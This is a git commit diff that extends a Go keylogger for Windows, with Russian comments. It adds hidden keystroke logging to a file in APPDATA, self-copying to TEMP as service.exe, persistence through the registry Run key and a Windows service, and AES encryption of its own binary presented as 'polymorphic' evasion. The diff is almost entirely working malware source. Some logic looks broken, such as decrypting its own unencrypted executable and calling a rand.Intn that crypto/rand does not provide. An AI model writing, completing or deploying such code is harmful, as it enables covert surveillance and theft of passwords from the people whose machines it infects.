27efe85d38153794c7b375b29c630a782242fdf5
Костенко Е <135466894+NanoTrash@users.noreply.github.com>
2025-02-28 05:17:25 +0300

    AES keylog.go

--- keylog.go
+++ keylog.go
@@ -1,29 +1,88 @@
 package main
 
 import (
-	"bytes"
+	"bufio"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
 	"encoding/base64"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"runtime"
-	"strings"
+	"strconv"
+	"sync"
 	"syscall"
 	"time"
 	"unsafe"
 
-	"github.com/shirou/gopsutil/process"
 	"golang.org/x/sys/windows"
+	"golang.org/x/sys/windows/registry"
 )
 
-// Полиморфная функция для изменения кода программы
-func polymorphicTransform(code []byte) []byte {
-	// Простой пример полиморфизма: шифрование Base64
-	encoded := base64.StdEncoding.EncodeToString(code)
-	return []byte(encoded)
+const (
+	serviceName = "BackgroundService"
+	logFileName = "hidden.log"
+	// Ключ шифрования (заменить на свой сгенерированный ключ)
+	encryptionKey = "12345678901234567890123456789012" // 32-байтный ключ AES-256
+)
+
+// Шифрование данных с помощью AES-256
+func encrypt(data []byte, key []byte) ([]byte, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
+		return nil, err
+	}
+
+	ciphertext := gcm.Seal(nonce, nonce, data, nil)
+	return ciphertext, nil
+}
+
+// Дешифрование данных с помощью AES-256
+func decrypt(data []byte, key []byte) ([]byte, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+
+	nonceSize := gcm.NonceSize()
+	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
+
+	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	return plaintext, nil
+}
+
+// Полиморфная функция для изменения кода программы (теперь с шифрованием)
+func polymorphicTransform(code []byte) ([]byte, error) {
+	encryptedCode, err := encrypt(code, []byte(encryptionKey))
+	if err != nil {
+		return nil, err
+	}
+	encoded := base64.StdEncoding.EncodeToString(encryptedCode)
+	return []byte(encoded), nil
 }
 
 // Функция для создания копии программы
@@ -34,17 +93,24 @@ func selfCopy() {
 		return
 	}
 
-	newExePath := filepath.Join(os.Getenv("TEMP"), "service.exe")
+	tempDir := os.Getenv("TEMP")
+	if tempDir == "" {
+		tempDir = os.TempDir()
+	}
+
+	newExePath := filepath.Join(tempDir, "service.exe")
 	data, err := ioutil.ReadFile(exePath)
 	if err != nil {
 		log.Println("Ошибка чтения исполняемого файла:", err)
 		return
 	}
 
-	// Применяем полиморфное преобразование
-	transformedData := polymorphicTransform(data)
+	transformedData, err := polymorphicTransform(data)
+	if err != nil {
+		log.Println("Ошибка полиморфного преобразования:", err)
+		return
+	}
 
-	// Декодируем обратно перед записью
 	decodedData, err := base64.StdEncoding.DecodeString(string(transformedData))
 	if err != nil {
 		log.Println("Ошибка декодирования:", err)
@@ -57,9 +123,32 @@ func selfCopy() {
 		return
 	}
 
-	// Запускаем новый экземпляр
 	cmd := exec.Command(newExePath)
 	cmd.Start()
+}
+
+// Функция для добавления в автозагрузку
+func addToStartup() {
+	exePath, err := os.Executable()
+	if err != nil {
+		log.Println("Ошибка получения пути исполняемого файла:", err)
+		return
+	}
+
+	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
+	if err != nil {
+		log.Println("Ошибка открытия ключа реестра:", err)
+		return
+	}
+	defer k.Close()
+
+	err = k.SetStringValue(serviceName, exePath)
+	if err != nil {
+		log.Println("Ошибка записи в реестр:", err)
+		return
+	}
+
+	log.Println("Добавлено в автозагрузку")
 }
 
 // Функция для установки программы как службы
@@ -67,7 +156,6 @@ func installService() {
 	serviceName := "BackgroundService"
 	servicePath, _ := os.Executable()
 
-	// Создаем службу
 	scm := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CREATE_SERVICE)
 	defer windows.CloseServiceHandle(scm)
 
@@ -82,7 +170,6 @@ func installService() {
 	}
 	defer windows.CloseServiceHandle(service)
 
-	// Запускаем службу
 	err = windows.StartService(service, 0, nil)
 	if err != nil {
 		log.Println("Ошибка запуска службы:", err)
@@ -91,7 +178,7 @@ func installService() {
 
 // Функция для записи нажатий клавиш
 func keylogger() {
-	filePath := filepath.Join(os.Getenv("APPDATA"), "hidden.log")
+	filePath := filepath.Join(os.Getenv("APPDATA"), logFileName)
 	file, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
 	if err != nil {
 		log.Println("Ошибка открытия файла:", err)
@@ -99,49 +186,154 @@ func keylogger() {
 	}
 	defer file.Close()
 
-	// Устанавливаем атрибут "скрытый" для файла
 	attr := windows.FileAttributeHidden
 	err = windows.SetFileAttributes(syscall.StringToUTF16Ptr(filePath), attr)
 	if err != nil {
+
 		log.Println("Ошибка установки атрибута 'скрытый':", err)
 	}
 
-	// Цикл для отслеживания нажатий клавиш
-	for {
-		buffer := make([]uint8, 256)
-		user32 := windows.NewLazySystemDLL("user32.dll")
-		getAsyncKeyState := user32.NewProc("GetAsyncKeyState")
+	user32 := windows.NewLazySystemDLL("user32.dll")
+	getAsyncKeyState := user32.NewProc("GetAsyncKeyState")
+	toUnicode := user32.NewProc("ToUnicode")
 
-		for i := uint8(0); i < 256; i++ {
-			ret, _, _ := getAsyncKeyState.Call(uintptr(i))
-			if ret != 0 {
-				key := fmt.Sprintf("%c", i)
-				file.WriteString(key)
+	writer := bufio.NewWriter(file)
+	var mu sync.Mutex
+	for {
+		for i := uint8(0); i < 255; i++ {
+			if getAsyncKeyState.Call(uintptr(i))&0x8000 != 0 {
+				var keyName string
+				switch i {
+				case windows.VK_LSHIFT, windows.VK_RSHIFT:
+					keyName = "[SHIFT]"
+				case windows.VK_LCONTROL, windows.VK_RCONTROL:
+					keyName = "[CTRL]"
+				case windows.VK_LMENU, windows.VK_RMENU:
+					keyName = "[ALT]"
+				case windows.VK_CAPITAL:
+					keyName = "[CAPS LOCK]"
+				case windows.VK_TAB:
+					keyName = "[TAB]"
+				case windows.VK_RETURN:
+					keyName = "[ENTER]"
+				case windows.VK_BACK:
+					keyName = "[BACKSPACE]"
+				case windows.VK_SPACE:
+					keyName = " "
+				default:
+					var keyboardState [256]byte
+					getKeyboardState := user32.NewProc("GetKeyboardState")
+					getKeyboardState.Call(uintptr(unsafe.Pointer(&keyboardState[0])))
+
+					var chars [16]uint16
+					vk := uintptr(i)
+					scanCode := uintptr(windows.MapVirtualKey(uint32(i), windows.MAPVK_VK_TO_VSC))
+					toUnicode.Call(vk, scanCode, uintptr(unsafe.Pointer(&keyboardState[0])), uintptr(unsafe.Pointer(&chars[0])), uintptr(16), uintptr(0))
+					if chars[0] != 0 {
+						keyName = syscall.UTF16ToString(chars[:])
+					} else {
+						keyName = "[VK:" + strconv.Itoa(int(i)) + "]"
+					}
+				}
+				mu.Lock()
+				_, err = writer.WriteString(keyName)
+				mu.Unlock()
+				if err != nil {
+					log.Println("Ошибка записи в файл:", err)
+				}
+				mu.Lock()
+				writer.Flush()
+				mu.Unlock()
+
 			}
 		}
 		time.Sleep(10 * time.Millisecond)
 	}
 }
 
+// checkDuplicate проверяет, запущен ли уже экземпляр программы с именем "service.exe"
+func checkDuplicate() bool {
+	var entry windows.ProcessEntry32
+	entry.Size = uint32(unsafe.Sizeof(entry))
+
+	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
+	if err != nil {
+		log.Println("Ошибка создания снимка процессов:", err)
+		return false
+	}
+	defer windows.CloseHandle(snapshot)
+
+	err = windows.Process32First(snapshot, &entry)
+	if err != nil {
+		log.Println("Ошибка получения первого процесса:", err)
+		return false
+	}
+
+	for {
+		if syscall.UTF16ToString(entry.ExeFile[:]) == "service.exe" && entry.ProcessID != uint32(os.Getpid()) {
+			return true
+		}
+
+		err = windows.Process32Next(snapshot, &entry)
+		if err != nil {
+			if err == windows.ERROR_NO_MORE_FILES {
+				return false
+			}
+			log.Println("Ошибка получения следующего процесса:", err)
+			return false
+		}
+	}
+}
+func removeSelfCopy() {
+	newExePath := filepath.Join(os.Getenv("TEMP"), "service.exe")
+	err := os.Remove(newExePath)
+	if err != nil {
+		log.Println("Ошибка удаления:", newExePath, err)
+		return
+	}
+	log.Println("Удалено:", newExePath)
+}
 // Основная функция
 func main() {
 	runtime.LockOSThread()
-
+    time.Sleep(time.Duration(rand.Intn(5000)) * time.Millisecond)
 	// Проверяем, запущена ли уже другая копия
-	processes, _ := process.Processes()
-	for _, p := range processes {
-		if strings.Contains(p.Name(), "service.exe") && p.Pid != os.Getpid() {
-			log.Println("Другая копия уже запущена.")
-			os.Exit(0)
-		}
+	if !checkDuplicate() {
+        
+		selfCopy()
+		addToStartup()
+		installService()
+        
+        
+        exePath, err := os.Executable()
+        if err != nil {
+            log.Println("Ошибка получения пути исполняемого файла:", err)
+            return
+        }
+    
+        data, err := ioutil.ReadFile(exePath)
+        if err != nil {
+            log.Println("Ошибка чтения исполняемого файла:", err)
+            return
+        }
+    
+        decryptedData, err := decrypt(data, []byte(encryptionKey))
+        if err != nil {
+            log.Println("Ошибка дешифрования:", err)
+            return
+        }
+
+    	err = ioutil.WriteFile(exePath, decryptedData, 0755)
+    	if err != nil {
+    		log.Println("Ошибка записи нового файла:", err)
+    		return
+    	}
+        
+        
+		keylogger()
+	} else {
+		log.Println("Другая копия уже запущена")
+		os.Exit(0)
 	}
-
-	// Самокопирование
-	selfCopy()
-
-	// Установка службы
-	installService()
-
-	// Запуск keylogger
-	keylogger()
+    removeSelfCopy()
 }
